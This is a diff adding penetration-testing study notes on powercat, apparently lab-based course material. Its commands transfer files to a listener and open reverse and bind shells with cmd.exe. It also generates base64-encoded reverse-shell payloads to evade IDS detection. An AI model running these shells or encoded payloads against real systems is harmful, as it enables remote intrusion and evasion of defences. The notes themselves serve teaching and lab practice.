@@ -307,3 +307,84 @@ nc -nv 10.11.0.22 443
 ```
 
 + Due to Administrative capabalities of powershell, Knowing how to use it in penetration test is extremenly important
+
+
+## 3.4 - POWERCAT
++ It is powershell version of `netcat` and simplifies creation of bind and reverse shells
++ After downloading powercat, we will import it in our current powershell session with `dot sourcing` to load the `powercat.ps1` script
++ Scripts loading in this way is only available in current session and it needs reloading in each powershell instance
+
+```powershell
+# See help
+powercat -h
+```
+
+## 3.5 - POWERCAT FILE TRANSFERS
++ First run an `netcat` listener on Alice's Linux machine
+
+```bash
+nc -lvnp 10001 > receiving_file
+```
+
++ Next we will invoke `powercat` on Bob's Windows machine
+
+```powershell
+powercat -c 10.11.0.4 -p 10001 -i C:\Users\username\Desktop\filename
+# -c specifies client mode
+# -p is port number
+# -i indicates local file to be transfered
+```
+
+## 3.6 - POWERCAT REVERSE SHELLS
++ The reverse shell process is similar to previous scenarios
++ First fire up a `netcat` listener on Alice's Linux machine
+
+```bash
+nc -lvnp 10001
+```
+
++ Next Bob's will runs `powercat`  in his Windows machine to send reverse shell 
+
+```powershell
+powercat -c 10.11.0.4 -p 10001 -e cmd.exe
+# -e indicates to execute the argument <cmd.exe> for example
+```
+
+## 3.7 - POWERCAT BIND SHELLS
++ We can use to create bind shell on Bob's computer
++ First We will create a bind shell on Bob's Windows machine using `powercat` command:
+
+```powershell
+powercat -l -p 10001 -e cmd.exe
+# -l is for listening mode
+# -p is port number
+# -e executes cmd.exe
+```
+
++ Then we will connect to Bob's bind shell from Alice's Linux machine using `netcat` command
+
+```bash
+nc -nv 10.11.0.22 10001
+```
+
+## 3.8 - POWERCAT STAND-ALONE PAYLOADS
++ powercat can also generates stand-alone payloads
++ It can generate powershell based payloads for connecting to remote host, Let's explore it
++ We begin by starting a `netcat` listener on Alice's Linux machine
+
+Generate a reverse shell by adding a `-g` to previous powecat commands:
+```powershell
+powercat -c 10.11.0.4 -p 10001 -e cmd.exe -g > reverseshell.ps1
+```
+
+This can be easily detected by IDS, We can overcome this issue by using Base64 encoding\
+To generate stand-alone base64 encoded payload we use `-ge` options
+```powershell
+powercat -c 10.11.0.4 -p 10001 -e cmd.exe -ge > encodedreverseshell.ps1
+```
+
+We can not run `encodedreverseshell.ps1` directly because it is a base64 encoded command\
+To run it we should run it with powershell command and `-E` oprtion which is for encoded commands
+```powershell
+powershell -E "Content of encodedreverseshell.ps1"
+```
